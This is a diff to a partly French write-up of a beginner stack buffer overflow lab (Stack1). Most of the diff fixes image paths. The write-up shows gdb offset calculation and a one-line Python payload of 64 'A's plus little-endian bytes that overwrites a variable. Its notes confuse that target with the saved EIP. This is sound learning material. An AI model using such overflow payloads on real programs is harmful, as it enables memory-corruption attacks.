@@ -13,7 +13,7 @@ gcc -m32 -std=gnu89 -fno-stack-protector -g -z execstack -no-pie Stack1.c -o Sta
 gdb -q ./Stack1
 disas main
 ```
-![Disas](Images\DisasMain.png)
+![Disas](Images/DisasMain.png)
 
 3. **Offset Calculation**
 - Calculate distance between buffer and and modified
@@ -21,7 +21,7 @@ disas main
 break *0x080491eb
 run < AAAAAAAAAAAAAAAAAAA
 ```
-![Break](Breakpoint.png)
+![Break](Images/Breakpoint.png)
 
 ```gdb
 print &buffer
@@ -29,7 +29,7 @@ print &modified
 print (char *)&modified - (char *)&buffer
 64 #Now test offset plus payload
 ```
-![Offset](Images\Offset.png)
+![Offset](images\Offset.png)
 
 4. **Build Payload and confirm** 
 - Payload will look like
@@ -43,9 +43,9 @@ break *0x080491eb
 p/x modified
 ```
 
-![Success1](Images\Success1.png)
+![Success1](Images/Success1.png)
 
-![Success2](Images\Success2.png)
+![Success2](Images/Success2.png)
 
 
 # What I learned
@@ -59,5 +59,5 @@ p/x modified
 - **Penser little-endian :** l’adresse de retour doit être écrite à l’envers (`0x61626364` ⇒ `"\x64\x63\x62\x61"`), sinon le processeur la lira à rebours.
 - **L’offset reste crucial :** 64 octets de bourrage atteignent pile l’EIP sauvegardé ; un seul ocet de plus ou de moins et l’EIP reste intact.
 - **Preuve à l’appui :** la commande  
-    `./stack1 "$(python3 -c 'print("A"*64 + "\\x64\\x63\\x62\\x61")')"`  
+    `./stack1 "$(python3 -c 'print("A"*64 + "\x64\x63\x62\x61")')"`  
     exécutée sous GDB affiche EIP = `0x61626364`, confirmant que la charge utile tombe exactement au bon endroit.
